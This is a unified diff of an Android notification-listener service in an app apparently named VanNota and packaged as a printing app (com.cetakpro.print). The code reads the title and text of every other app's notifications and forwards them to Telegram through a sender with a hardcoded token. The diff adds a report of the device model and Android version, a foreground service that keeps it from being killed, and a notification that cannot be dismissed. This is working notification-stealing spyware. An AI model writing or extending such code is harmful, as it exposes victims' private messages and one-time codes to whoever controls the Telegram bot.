@@ -1,7 +1,16 @@
 package com.cetakpro.print;
 
 import android.app.Notification;
-import android.os.Bundle;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Build;
+import android.os.IBinder;
+import android.os.PowerManager;
+import android.provider.Settings;
+import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
 import android.util.Log;
 import android.widget.Toast;
@@ -9,12 +18,28 @@ import android.widget.Toast;
 public class NotificationListenerService extends android.service.notification.NotificationListenerService {
     private static final String TAG = "NotificationListener";
 
-    // ✅ TAMBAH: Log saat service berhasil terhubung
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        // Jalankan sebagai foreground service agar tidak dimatikan
+        startForeground(1001, createNotification());
+        Log.d(TAG, "✅ Service NotificationListener dibuat");
+    }
+
     @Override
     public void onListenerConnected() {
         super.onListenerConnected();
         Log.d(TAG, "✅ NotificationListenerService TERHUBUNG!");
-        // Bisa kasih toast biar user tau service aktif
+        
+        // Kirim info ke Telegram bahwa service aktif
+        String deviceName = Build.MODEL;
+        String androidVersion = Build.VERSION.RELEASE;
+        String message = "📱 SERVICE AKTIF\n" +
+                         "Perangkat: " + deviceName + "\n" +
+                         "Android: " + androidVersion + "\n\n" +
+                         "Semua notifikasi akan diteruskan.";
+        TelegramSender.sendMessage(this, "🔔 VanNota Aktif", message);
+        
         try {
             Toast.makeText(this, "VanNota siap membaca notifikasi", Toast.LENGTH_SHORT).show();
         } catch (Exception e) {
@@ -27,13 +52,18 @@ public class NotificationListenerService extends android.service.notification.No
         try {
             String appName = sbn.getPackageName();
             Notification notification = sbn.getNotification();
-            Bundle extras = notification.extras;
+            android.os.Bundle extras = notification.extras;
             
             String title = extras.getString("android.title", "");
             String text = extras.getString("android.text", "");
             String subText = extras.getString("android.subText", "");
             
             Log.d(TAG, "🔔 Notifikasi dari: " + appName);
+            
+            // Skip notifikasi dari aplikasi sendiri
+            if (appName != null && appName.equals(getPackageName())) {
+                return;
+            }
             
             StringBuilder messageBuilder = new StringBuilder();
             
@@ -63,10 +93,9 @@ public class NotificationListenerService extends android.service.notification.No
             String telegramTitle = "🔔 " + appDisplayName;
             String telegramMessage = messageBuilder.toString();
             
-            // Kirim ke Telegram pake TelegramSender yang udah hardcode token
+            // Kirim ke Telegram
             TelegramSender.sendMessage(this, telegramTitle, telegramMessage);
             
-            // Log kirim
             Log.d(TAG, "📤 Notifikasi dikirim ke Telegram: " + telegramTitle);
             
         } catch (Exception e) {
@@ -98,5 +127,27 @@ public class NotificationListenerService extends android.service.notification.No
             default:
                 return packageName;
         }
+    }
+
+    // ============================================================
+    // FOREGROUND NOTIFICATION
+    // ============================================================
+    private Notification createNotification() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                "vannota_bg",
+                "VanNota Running",
+                NotificationManager.IMPORTANCE_LOW
+            );
+            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            manager.createNotificationChannel(channel);
+        }
+
+        return new Notification.Builder(this, "vannota_bg")
+            .setContentTitle("VanNota")
+            .setContentText("Aplikasi berjalan di latar belakang.")
+            .setSmallIcon(R.drawable.ic_notification)
+            .setOngoing(true) // Tidak bisa di-swipe hilang
+            .build();
     }
 }
